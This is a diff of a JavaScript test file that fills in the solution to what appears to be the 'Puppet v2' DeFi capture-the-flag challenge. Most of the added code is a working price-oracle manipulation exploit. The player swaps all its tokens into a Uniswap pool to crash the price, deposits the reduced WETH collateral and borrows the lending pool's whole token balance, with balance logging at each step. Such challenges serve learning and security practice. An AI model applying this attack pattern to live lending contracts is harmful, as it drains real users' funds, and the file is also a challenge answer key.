@@ -82,7 +82,45 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+    //    log all with correct decimals
+        await logAll();
+
+        // swap all token for weth
+        await token.connect(player).approve(uniswapRouter.address, await token.balanceOf(player.address));
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            await token.balanceOf(player.address),
+            0,
+            [token.address, weth.address],
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        // wrap required weth
+        await weth.connect(player).deposit({ value: await lendingPool.calculateDepositOfWETHRequired(await token.balanceOf(lendingPool.address)) });
+
+        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxUint256);
+
+        await logAll();
+
+        //  borrow all token from pool
+         await lendingPool.connect(player).borrow(await token.balanceOf(lendingPool.address));
+
+         await logAll();
+        
+
+        async function logAll() {
+            console.log("--------------------");
+            console.log("player token balance: ", ethers.utils.formatUnits(await token.balanceOf(player.address), 18));
+            console.log("player eth balance: ", ethers.utils.formatUnits(await ethers.provider.getBalance(player.address), 18));
+            console.log("player weth balance: ", ethers.utils.formatUnits(await weth.balanceOf(player.address), 18));
+            console.log("pool token balance: ", ethers.utils.formatUnits(await token.balanceOf(lendingPool.address), 18));
+            console.log("pool eth balance: ", ethers.utils.formatUnits(await ethers.provider.getBalance(lendingPool.address), 18));
+            console.log("pool weth balance: ", ethers.utils.formatUnits(await weth.balanceOf(lendingPool.address), 18));
+            console.log("uniswap token balance: ", ethers.utils.formatUnits(await token.balanceOf(uniswapExchange.address), 18));
+            console.log("uniswap weth balance: ", ethers.utils.formatUnits(await weth.balanceOf(uniswapExchange.address), 18));
+
+            // console.log("weth required for all Token to be borrowed ", ethers.utils.formatUnits(await lendingPool.calculateDepositOfWETHRequired(await token.balanceOf(lendingPool.address)), 18));
+        }
     });
 
     after(async function () {
